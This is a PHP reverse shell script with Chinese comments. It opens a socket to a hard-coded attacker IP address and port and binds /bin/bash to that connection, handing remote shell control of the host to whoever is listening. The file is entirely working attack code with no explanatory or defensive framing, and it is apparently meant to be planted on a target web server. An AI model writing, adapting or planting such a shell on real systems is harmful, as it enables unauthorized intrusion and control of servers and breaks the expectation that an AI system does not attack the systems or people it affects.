<?php
// 配置你的攻击机 IP 和端口
$ip = '114.134.187.38';   // 例如 114.134.187.38 或 27.47.152.10
$port = 5555;           // 与监听端口一致

// 创建 socket 连接
$sock = fsockopen($ip, $port);
if (!$sock) {
    // 可选：写入日志或直接退出
    die("fsockopen failed\n");
}

// 设置要执行的命令（/bin/bash 或 /bin/sh）
$cmd = '/bin/bash';

// 描述符：将 socket 作为子进程的 stdin/stdout/stderr
$descriptorspec = [
    0 => $sock,  // stdin
    1 => $sock,  // stdout
    2 => $sock   // stderr
];

// 使用 proc_open 打开进程
$process = proc_open($cmd, $descriptorspec, $pipes);

if (is_resource($process)) {
    // 等待进程结束（可选）
    proc_close($process);
}
// 关闭 socket
fclose($sock);
?>
